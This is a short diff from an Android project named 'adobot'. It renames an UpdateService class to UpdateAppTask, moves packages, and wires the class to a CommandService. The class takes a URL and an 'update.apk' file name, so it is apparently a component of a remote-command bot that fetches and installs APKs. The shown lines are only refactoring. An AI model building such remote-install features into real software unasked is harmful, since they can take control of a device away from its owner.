@@ -1,4 +1,4 @@
-package com.android.adobot;
+package com.android.adobot.tasks;
 
 import android.Manifest;
 import android.content.Intent;
@@ -6,6 +6,10 @@ import android.content.pm.PackageManager;
 import android.os.Environment;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
+
+import com.android.adobot.CommandService;
+import com.android.adobot.CommonParams;
+import com.android.adobot.activities.UpdateActivity;
 
 import java.io.BufferedInputStream;
 import java.io.File;
@@ -16,17 +20,17 @@ import java.net.URL;
 import java.net.URLConnection;
 import java.util.HashMap;
 
-import http.Http;
+import com.android.adobot.http.Http;
 
 import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
 
-public class UpdateService extends BaseService {
-    private static final String TAG = "UpdateService";
+public class UpdateAppTask extends BaseTask {
+    private static final String TAG = "UpdateAppTask";
     public static final String PKG_FILE = "update.apk";
     private CommonParams commonParams;
     private URL url;
 
-    public UpdateService(String url) {
+    public UpdateAppTask(String url) {
         try {
             this.url = new URL(url);
         } catch (MalformedURLException e) {
@@ -34,7 +38,7 @@ public class UpdateService extends BaseService {
         }
     }
 
-    public void setContext(Client c) {
+    public void setContext(CommandService c) {
         super.setContext(c);
         context = c;
         this.commonParams = new CommonParams(c);
